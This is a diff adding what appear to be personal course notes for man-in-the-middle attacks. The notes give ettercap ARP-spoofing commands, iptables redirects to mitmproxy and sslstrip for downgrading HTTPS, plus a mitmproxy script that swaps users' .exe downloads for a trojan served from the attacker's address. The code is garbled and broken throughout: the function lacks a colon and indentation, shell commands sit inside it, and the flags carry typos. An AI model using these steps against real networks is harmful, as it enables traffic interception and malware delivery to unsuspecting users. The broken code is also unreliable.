@@ -1,0 +1,53 @@
+changes Trojan files into ext
+
+geany
+import mitmproxy
+
+def request(flow)
+#code to handle request flows
+if flow.request.host !="ipaddress" and flow.request.pretty_url.endswith("exe"):
+print("[+] Got interesting flow")
+python trojan factory.py
+subprocess.call("copy from the command line and paste bash command)
+flow.response = mitmproxy.http.HTTPResponse.make(301["location":"http://ipaddress?file.exe"})
+
+
+
+
+ettercap -Tq -M arp:remote -i etho0 -S /ipaddress// /target ipaddress///
+
+/.mitmdump -s /root/basic.py --transparent
+
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to--port 8080
+
+
+Generating Trojans on the 
+opt/trojanfactoey/python
+python.trojanfactory.py (what you copied last time paste it here)
+cd/root
+python trojan_factory.py(to use it outside the tool specify the folder)
+/opt/TrojanFactory/trojan_factory.py 
+/.mitmdump -s /root/basic.py --transparent
+ettercap -Tq -M arp:oneway -i eth0 -s /ipaddress/// /gatewayipaddress///
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to--port 8080
+./mitmdump -s /opt/TrojanFactory/mitmproxy_script.py --transparent
+ettercap -Tq -M arp:oneway -i eth0 -s /ipaddress/// /gatewayipaddress///
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to--port 8080
+
+Bypassing HTTPS using mitmproxy
+download sslstrip from github
+ettercap -Tq -M arp:remote -i eth0 -s /ipaddress/// /gatewayipaddress///
+./mitmdump -s sslstrip.py --transparent
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to--port 8080
+
+
+redirecting the flow
+ettercap -Tq -M arp:remote -i eth0 -s /ipaddress/// /gatewayipaddress///(arpspoof)
+./mitmdump -s sslstrip.py -s /root/basic.py --transparent
+./mitmdump -s sslstrip.py -s --transparent place --replace(for https site)
+
+security
+ 
+
